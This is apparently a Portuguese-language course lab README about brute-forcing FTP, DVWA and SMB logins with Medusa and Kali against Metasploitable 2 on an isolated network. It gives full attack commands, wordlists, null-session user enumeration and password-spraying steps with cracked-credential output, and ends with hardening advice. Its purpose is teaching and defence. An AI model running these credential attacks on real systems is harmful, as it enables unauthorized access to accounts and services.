# Auditoria de Credenciais e Simulação de Força Bruta com Kali Linux e Medusa

Este repositório documenta a implementação prática de cenários de auditoria de autenticação, ataques de força bruta (*Brute Force*) e *Password Spraying* em ambiente controlado, desenvolvido como entrega oficial para o desafio técnico da **Digital Innovation One (DIO)**.

> **AVISO LEGAL E ÉTICO (DISCLAIMER):**
>
> Todo o conteúdo, comandos, wordlists e técnicas apresentados neste repositório possuem finalidade **estritamente educacional e de pesquisa em segurança defensiva**. Os testes foram executados exclusivamente em máquinas virtuais isoladas e de propriedade do autor. A utilização dessas técnicas contra sistemas sem autorização prévia e explícita é ilegal.

## Índice

* [Objetivos do Projeto](#objetivos-do-projeto)
* [Arquitetura e Configuração do Laboratório](#arquitetura-e-configuração-do-laboratório)
* [Estrutura do Repositório](#estrutura-do-repositório)
* [Preparação das Wordlists](#preparação-das-wordlists)
* [Cenários Práticos Executados](#cenários-práticos-executados)
  * [Cenário 1: Força Bruta em FTP (Porta 21)](#cenário-1-força-bruta-em-ftp-porta-21)
  * [Cenário 2: Automação em Formulário Web (DVWA)](#cenário-2-automação-em-formulário-web-dvwa)
  * [Cenário 3: Enumeração de Usuários e Password Spraying em SMB](#cenário-3-enumeração-de-usuários-e-password-spraying-em-smb)
* [Medidas de Mitigação e Hardening](#medidas-de-mitigação-e-hardening)
* [Lições Aprendidas e Conclusão](#lições-aprendidas-e-conclusão)

## Objetivos do Projeto

* Configurar um ambiente de laboratório seguro e isolado utilizando **Oracle VirtualBox**.
* Compreender o funcionamento interno de ataques de quebra de credenciais em diferentes protocolos (**FTP**, **HTTP/Web** e **SMB**).
* Operar a ferramenta **Medusa** no **Kali Linux** explorando seus módulos específicos (`ftp`, `web-form`, `smbnt`).
* Realizar reconhecimento prévio (*enumeration*) para otimizar ataques de *Password Spraying*.
* Propor controles técnicos de *hardening* e detecção para mitigar cada vetor explorado.

## Arquitetura e Configuração do Laboratório

Para garantir que nenhum tráfego de ataque vazasse para a rede física ou externa, as duas máquinas virtuais foram configuradas em uma rede interna isolada (**Host-Only Network**).

### Topologia de Rede

```text
+-------------------------------------------------------+
|          Host-Only Network (192.168.56.0/24)          |
|                                                       |
|   +-----------------------+   +-------------------+   |
|   |   VM 01: Atacante     |   |   VM 02: Alvo     |   |
|   |   Kali Linux          |-->|   Metasploitable 2|   |
|   |   IP: 192.168.56.101  |   |   IP: 192.168.56.102| |
|   +-----------------------+   +-------------------+   |
+-------------------------------------------------------+
```

### Especificações das Máquinas Virtuais

| Função | Sistema Operacional | Interface de Rede | Endereço IP | Serviços Relevantes |
| :--- | :--- | :--- | :--- | :--- |
| **Atacante** | Kali Linux (2024+) | Host-Only (`eth0`) | `192.168.56.101` | Medusa, Nmap, Enum4linux, Curl |
| **Alvo** | Metasploitable 2 | Host-Only (`eth0`) | `192.168.56.102` | vsftpd (21), Apache/DVWA (80), Samba (139/445) |

## Estrutura do Repositório

```text
.
├── README.md                   # Documentação completa do projeto
├── wordlists/                  # Listas customizadas utilizadas nos testes
│   ├── users.txt               # Lista de usuários alvo
│   ├── passwords.txt           # Lista de senhas comuns
│   └── smb_users.txt           # Usuários extraídos via enumeração SMB
└── images/                     # Evidências e capturas de tela dos testes
    ├── 01-recon-nmap.png       # Varredura inicial de portas no alvo
    ├── 02-ftp-medusa.png       # Execução e sucesso no módulo FTP
    ├── 03-dvwa-webform.png     # Quebra de autenticação no DVWA
    └── 04-smb-spraying.png     # Enumeração e Password Spraying em SMB
```

## Preparação das Wordlists

Antes de iniciar os testes, foi realizado o reconhecimento inicial com `nmap -sV 192.168.56.102` para confirmar os serviços ativos. Em seguida, criamos wordlists enxutas e direcionadas para validar a eficácia dos ataques sem gerar sobrecarga desnecessária no ambiente:

**`wordlists/users.txt`**

```text
admin
msfadmin
user
service
postgres
root
```

**`wordlists/passwords.txt`**

```text
123456
admin
password
msfadmin
root
service
12345678
```

## Cenários Práticos Executados

### Cenário 1: Força Bruta em FTP (Porta 21)

O serviço **vsftpd 2.3.4** rodando no Metasploitable 2 não possui limitação de tentativas de login por minuto, tornando-o suscetível a ataques de dicionário automatizados.

#### 1. Comando Executado

```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -t 4 -f
```

*Parâmetros utilizados:*

* `-h`: IP do host alvo.
* `-U` / `-P`: Caminhos das wordlists de usuários e senhas.
* `-M ftp`: Seleção do módulo de protocolo FTP.
* `-t 4`: Execução de 4 *threads* simultâneas.
* `-f`: Encerra a execução ao encontrar a primeira credencial válida.

#### 2. Resultado e Validação

O Medusa identificou rapidamente a credencial válida:

```text
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

Para validar o acesso, foi estabelecida uma sessão interativa via cliente FTP padrão:

```bash
ftp 192.168.56.102
# Login com msfadmin / msfadmin -> 230 Login successful.
```

> **Evidência visual:** disponível em `images/02-ftp-medusa.png`

### Cenário 2: Automação em Formulário Web (DVWA)

Neste cenário, exploramos o módulo de *Brute Force* da aplicação **Damn Vulnerable Web Application (DVWA)** configurada com nível de segurança **Low**.

#### 1. Coleta de Parâmetros da Requisição

Após autenticar no DVWA (`admin` / `password`) e definir a segurança como *Low*, inspecionamos a requisição HTTP via navegador (DevTools) para extrair:

* **Endpoint:** `dvwa/vulnerabilities/brute/`
* **Método:** `GET`
* **Campos do formulário:** `username`, `password` e botão `Login=Login`
* **Cookie de Sessão:** `PHPSESSID` e `security=low`
* **Mensagem de erro (Deny Signal):** `Username and/or password incorrect.`

#### 2. Comando Executado

```bash
medusa -h 192.168.56.102 -u admin -P wordlists/passwords.txt -M web-form \
  -m FORM:"dvwa/vulnerabilities/brute/|get|username=&password=&Login=Login" \
  -m DENY-SIGNAL:"Username and/or password incorrect." \
  -m COOKIE:"PHPSESSID=a1b2c3d4e5f6g7h8i9j0; security=low"
```

#### 3. Resultado e Validação

O Medusa diferenciou as respostas HTTP analisando a ausência da string de erro (`DENY-SIGNAL`):

```text
ACCOUNT FOUND: [web-form] Host: 192.168.56.102 User: admin Password: password [SUCCESS]
```

> **Evidência visual:** disponível em `images/03-dvwa-webform.png`

### Cenário 3: Enumeração de Usuários e Password Spraying em SMB

Em ambientes corporativos, testar dezenas de senhas contra um único usuário dispara bloqueios de conta (*Account Lockout*). Para contornar esse mecanismo, aplicamos a técnica de **Password Spraying**: enumeramos os usuários existentes primeiro e testamos uma única senha comum contra toda a lista.

#### 1. Enumeração de Usuários via RPC/SMB

Utilizando o `enum4linux`, exploramos sessões nulas (*Null Sessions*) permitidas pelo Samba desatualizado:

```bash
enum4linux -U 192.168.56.102 | grep "user:" | cut -d "[" -f2 | cut -d "]" -f1 > wordlists/smb_users.txt
```

#### 2. Execução do Password Spraying

Com a lista `smb_users.txt` populada, testamos senhas fracas/padrão uma a uma contra todos os usuários:

```bash
medusa -h 192.168.56.102 -U wordlists/smb_users.txt -p "msfadmin" -M smbnt
medusa -h 192.168.56.102 -U wordlists/smb_users.txt -p "service" -M smbnt
medusa -h 192.168.56.102 -U wordlists/smb_users.txt -p "postgres" -M smbnt
```

#### 3. Resultado e Validação

Foram comprometidas múltiplas contas de serviço e administração (`msfadmin:msfadmin`, `service:service`, `postgres:postgres`). A validação foi feita listando os compartilhamentos acessíveis via `smbclient`:

```bash
smbclient -L //192.168.56.102 -U msfadmin
```

> **Evidência visual:** disponível em `images/04-smb-spraying.png`

## Medidas de Mitigação e Hardening

A partir das vulnerabilidades exploradas, foram mapeadas as seguintes contramedidas defensivas recomendadas para ambientes de produção:

| Vetor / Serviço | Vulnerabilidade Explorada | Contramedida Recomendada (Hardening) |
| :--- | :--- | :--- |
| **Geral (Autenticação)** | Senhas fracas, previsíveis ou iguais ao nome de usuário. | Aplicar política de senhas fortes (mínimo 12+ caracteres, entropia alta), bloqueio de senhas vazadas e **MFA (Autenticação Multifator)**. |
| **Geral (Rede/Host)** | Tentativas ilimitadas de login em alta velocidade. | Implementar **Fail2Ban** para banimento dinâmico de IPs após *X* falhas e configurar políticas de bloqueio temporário de conta (`pam_faillock`). |
| **FTP (Porta 21)** | Tráfego em texto claro e ausência de controle de taxa. | Desativar o FTP tradicional e migrar para **SFTP** (sobre SSH) ou **FTPS**; desabilitar login anônimo. |
| **Aplicação Web (DVWA)** | Ausência de proteção contra automação e tokens CSRF. | Implementar **Rate Limiting** no Web Server/WAF (ex: Nginx `limit_req`), tokens **Anti-CSRF** dinâmicos, **CAPTCHA** após falhas e migrar formulários para `POST` sobre **HTTPS**. |
| **SMB (Portas 139/445)** | Enumeração anônima de usuários e protocolo legado. | Desativar **SMBv1**, exigir **SMB Signing** e bloquear enumeração anônima configurando `restrict anonymous = 2` no `smb.conf`. |

## Lições Aprendidas e Conclusão

A realização deste laboratório consolidou na prática como a segurança ofensiva e defensiva são complementares:

1. **A importância do reconhecimento:** A enumeração prévia via `enum4linux` transformou um ataque ruidoso de força bruta em um *Password Spraying* cirúrgico e muito mais difícil de ser detectado por limiares simples de bloqueio por conta.
2. **Defesa em profundidade:** Nenhuma medida isolada é suficiente. A combinação entre **senhas robustas**, **desativação de protocolos legados** e **monitoramento ativo de logs** reduz drasticamente a superfície de ataque.
3. **Documentação técnica:** Estruturar evidências, comandos e recomendações de remediação é uma habilidade essencial para profissionais de *Pentest* e *Blue Team*.

### Autor

Desenvolvido por **Wesley Henrique Silva** como parte da formação em Cibersegurança na **DIO**.